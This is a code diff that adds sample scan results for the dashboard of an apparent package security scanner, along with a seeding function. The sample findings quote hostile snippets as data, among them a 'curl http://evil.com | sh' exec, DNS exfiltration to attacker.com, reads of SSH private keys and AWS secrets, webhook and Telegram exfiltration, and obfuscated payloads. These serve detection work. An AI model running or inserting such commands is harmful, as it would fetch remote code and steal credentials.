@@ -24,6 +24,315 @@ from api.models import ScanPhase, Severity
 
 logger = logging.getLogger(__name__)
 
+SCAN_TABLE = "scans"
+
+
+# ---------------------------------------------------------------------------
+# Sample scan data (for dashboard display)
+# ---------------------------------------------------------------------------
+
+SAMPLE_SCANS: list[dict] = [
+    {
+        "id": "seed_001",
+        "target": "example-package",
+        "target_type": "npm",
+        "files_scanned": 42,
+        "findings_count": 3,
+        "risk_score": 15.0,
+        "verdict": "MEDIUM_RISK",
+        "threat_hits": 0,
+        "findings_json": [
+            {
+                "phase": "code_patterns",
+                "rule": "eval-usage",
+                "severity": "HIGH",
+                "file": "src/utils.js",
+                "line": 23,
+                "snippet": "eval(userInput)",
+                "weight": 5.0,
+            },
+            {
+                "phase": "obfuscation",
+                "rule": "base64-decode",
+                "severity": "MEDIUM",
+                "file": "src/config.js",
+                "line": 11,
+                "snippet": "atob(encodedConfig)",
+                "weight": 3.0,
+            },
+            {
+                "phase": "network_exfil",
+                "rule": "outbound-http",
+                "severity": "LOW",
+                "file": "src/api.js",
+                "line": 5,
+                "snippet": "fetch('https://api.example.com/data')",
+                "weight": 1.0,
+            },
+        ],
+        "metadata_json": {},
+        "created_at": "2026-02-20T10:00:00",
+    },
+    {
+        "id": "seed_002",
+        "target": "safe-logger",
+        "target_type": "pip",
+        "files_scanned": 18,
+        "findings_count": 0,
+        "risk_score": 0.0,
+        "verdict": "CLEAN",
+        "threat_hits": 0,
+        "findings_json": [],
+        "metadata_json": {},
+        "created_at": "2026-02-21T14:30:00",
+    },
+    {
+        "id": "seed_003",
+        "target": "backdoor-loader",
+        "target_type": "npm",
+        "files_scanned": 7,
+        "findings_count": 6,
+        "risk_score": 85.0,
+        "verdict": "CRITICAL",
+        "threat_hits": 2,
+        "findings_json": [
+            {
+                "phase": "install_hooks",
+                "rule": "npm-postinstall",
+                "severity": "CRITICAL",
+                "file": "package.json",
+                "line": 12,
+                "snippet": '"postinstall": "node setup.js"',
+                "weight": 10.0,
+            },
+            {
+                "phase": "code_patterns",
+                "rule": "child-process-exec",
+                "severity": "HIGH",
+                "file": "setup.js",
+                "line": 3,
+                "snippet": "child_process.exec('curl http://evil.com | sh')",
+                "weight": 5.0,
+            },
+            {
+                "phase": "network_exfil",
+                "rule": "webhook-exfil",
+                "severity": "HIGH",
+                "file": "setup.js",
+                "line": 18,
+                "snippet": "https://discord.com/api/webhooks/...",
+                "weight": 3.0,
+            },
+            {
+                "phase": "credentials",
+                "rule": "env-access",
+                "severity": "MEDIUM",
+                "file": "setup.js",
+                "line": 7,
+                "snippet": "process.env['AWS_SECRET_ACCESS_KEY']",
+                "weight": 2.0,
+            },
+            {
+                "phase": "obfuscation",
+                "rule": "base64-payload",
+                "severity": "HIGH",
+                "file": "lib/payload.js",
+                "line": 1,
+                "snippet": "atob('ZXZhbChhdG9iKC...')",
+                "weight": 5.0,
+            },
+            {
+                "phase": "obfuscation",
+                "rule": "hex-encoding",
+                "severity": "HIGH",
+                "file": "lib/payload.js",
+                "line": 14,
+                "snippet": "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f",
+                "weight": 5.0,
+            },
+        ],
+        "metadata_json": {"quarantined": True},
+        "created_at": "2026-02-22T09:15:00",
+    },
+    {
+        "id": "seed_004",
+        "target": "my-web-app",
+        "target_type": "directory",
+        "files_scanned": 134,
+        "findings_count": 1,
+        "risk_score": 5.0,
+        "verdict": "LOW_RISK",
+        "threat_hits": 0,
+        "findings_json": [
+            {
+                "phase": "credentials",
+                "rule": "env-access",
+                "severity": "MEDIUM",
+                "file": "config/settings.py",
+                "line": 42,
+                "snippet": "os.environ['API_KEY']",
+                "weight": 2.0,
+            },
+        ],
+        "metadata_json": {"approved": True},
+        "created_at": "2026-02-22T16:45:00",
+    },
+    {
+        "id": "seed_005",
+        "target": "crypto-wallet-lib",
+        "target_type": "pip",
+        "files_scanned": 23,
+        "findings_count": 5,
+        "risk_score": 62.0,
+        "verdict": "HIGH_RISK",
+        "threat_hits": 1,
+        "findings_json": [
+            {
+                "phase": "code_patterns",
+                "rule": "exec-usage",
+                "severity": "HIGH",
+                "file": "wallet/core.py",
+                "line": 88,
+                "snippet": "exec(decoded_payload)",
+                "weight": 5.0,
+            },
+            {
+                "phase": "network_exfil",
+                "rule": "dns-exfil",
+                "severity": "HIGH",
+                "file": "wallet/sync.py",
+                "line": 33,
+                "snippet": "dns.resolve(encoded_data + '.exfil.attacker.com')",
+                "weight": 3.0,
+            },
+            {
+                "phase": "credentials",
+                "rule": "private-key-read",
+                "severity": "CRITICAL",
+                "file": "wallet/keys.py",
+                "line": 12,
+                "snippet": "open(os.path.expanduser('~/.ssh/id_rsa'))",
+                "weight": 2.0,
+            },
+            {
+                "phase": "obfuscation",
+                "rule": "base64-decode",
+                "severity": "HIGH",
+                "file": "wallet/core.py",
+                "line": 85,
+                "snippet": "base64.b64decode(encoded)",
+                "weight": 5.0,
+            },
+            {
+                "phase": "provenance",
+                "rule": "binary-file",
+                "severity": "MEDIUM",
+                "file": "wallet/native.so",
+                "line": 0,
+                "snippet": "(binary file)",
+                "weight": 1.0,
+            },
+        ],
+        "metadata_json": {"quarantined": True},
+        "created_at": "2026-02-23T08:00:00",
+    },
+    {
+        "id": "seed_006",
+        "target": "react-ui-components",
+        "target_type": "npm",
+        "files_scanned": 87,
+        "findings_count": 0,
+        "risk_score": 0.0,
+        "verdict": "CLEAN",
+        "threat_hits": 0,
+        "findings_json": [],
+        "metadata_json": {"approved": True},
+        "created_at": "2026-02-23T11:20:00",
+    },
+    {
+        "id": "seed_007",
+        "target": "data-analytics-sdk",
+        "target_type": "pip",
+        "files_scanned": 56,
+        "findings_count": 2,
+        "risk_score": 8.0,
+        "verdict": "LOW_RISK",
+        "threat_hits": 0,
+        "findings_json": [
+            {
+                "phase": "network_exfil",
+                "rule": "outbound-http",
+                "severity": "LOW",
+                "file": "analytics/client.py",
+                "line": 45,
+                "snippet": "requests.post('https://telemetry.example.com')",
+                "weight": 1.0,
+            },
+            {
+                "phase": "provenance",
+                "rule": "minified-js",
+                "severity": "LOW",
+                "file": "static/bundle.min.js",
+                "line": 0,
+                "snippet": "(minified file)",
+                "weight": 1.0,
+            },
+        ],
+        "metadata_json": {},
+        "created_at": "2026-02-24T09:30:00",
+    },
+    {
+        "id": "seed_008",
+        "target": "typosquat-requests",
+        "target_type": "pip",
+        "files_scanned": 4,
+        "findings_count": 4,
+        "risk_score": 92.0,
+        "verdict": "CRITICAL",
+        "threat_hits": 1,
+        "findings_json": [
+            {
+                "phase": "install_hooks",
+                "rule": "setup-py-exec",
+                "severity": "CRITICAL",
+                "file": "setup.py",
+                "line": 8,
+                "snippet": "cmdclass={'install': PostInstallCommand}",
+                "weight": 10.0,
+            },
+            {
+                "phase": "code_patterns",
+                "rule": "pickle-loads",
+                "severity": "HIGH",
+                "file": "lib/loader.py",
+                "line": 15,
+                "snippet": "pickle.loads(data)",
+                "weight": 5.0,
+            },
+            {
+                "phase": "network_exfil",
+                "rule": "telegram-c2",
+                "severity": "CRITICAL",
+                "file": "lib/exfil.py",
+                "line": 22,
+                "snippet": "api.telegram.org/bot<TOKEN>/sendMessage",
+                "weight": 3.0,
+            },
+            {
+                "phase": "obfuscation",
+                "rule": "hex-encoding",
+                "severity": "HIGH",
+                "file": "lib/loader.py",
+                "line": 3,
+                "snippet": "bytes.fromhex('687474703a2f2f...')",
+                "weight": 5.0,
+            },
+        ],
+        "metadata_json": {"quarantined": True, "rejected": True},
+        "created_at": "2026-02-25T07:10:00",
+    },
+]
+
 
 # ---------------------------------------------------------------------------
 # Known malicious packages (real-world examples)
@@ -799,15 +1108,37 @@ async def seed_publishers() -> int:
     return count
 
 
+async def seed_scans() -> int:
+    """Insert sample scan records for dashboard display.
+
+    Idempotent: skips scans whose ID already exists in the database.
+    """
+    count = 0
+    for scan in SAMPLE_SCANS:
+        existing = await db.select_one(SCAN_TABLE, {"id": scan["id"]})
+        if existing is not None:
+            logger.info("Scan '%s' already exists — skipping", scan["id"])
+            continue
+        try:
+            await db.insert(SCAN_TABLE, dict(scan))
+            count += 1
+        except Exception:
+            logger.warning("Failed to seed scan: %s", scan["id"])
+    logger.info("Seeded %d scan entries", count)
+    return count
+
+
 async def seed_all() -> dict[str, int]:
     """Run all seed functions and return counts."""
     threats = await seed_threats()
     signatures = await seed_signatures()
     publishers = await seed_publishers()
+    scans = await seed_scans()
     return {
         "threats": threats,
         "signatures": signatures,
         "publishers": publishers,
+        "scans": scans,
     }
 
 
@@ -821,10 +1152,29 @@ async def _main() -> None:
     logging.basicConfig(
         level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s"
     )
+    print("Sigil seed_data — populating database with sample data...")
     await db.connect()
     try:
-        result = await seed_all()
-        logger.info("Seed complete: %s", result)
+        print("  Seeding threat intelligence entries...")
+        threats = await seed_threats()
+        print(f"    -> {threats} threats seeded")
+
+        print("  Seeding detection signatures...")
+        signatures = await seed_signatures()
+        print(f"    -> {signatures} signatures seeded")
+
+        print("  Seeding publisher reputation entries...")
+        publishers = await seed_publishers()
+        print(f"    -> {publishers} publishers seeded")
+
+        print("  Seeding sample scan data for dashboard...")
+        scans = await seed_scans()
+        print(f"    -> {scans} scans seeded")
+
+        print(
+            f"\nSeed complete: {threats} threats, {signatures} signatures, "
+            f"{publishers} publishers, {scans} scans"
+        )
     finally:
         await db.disconnect()
 
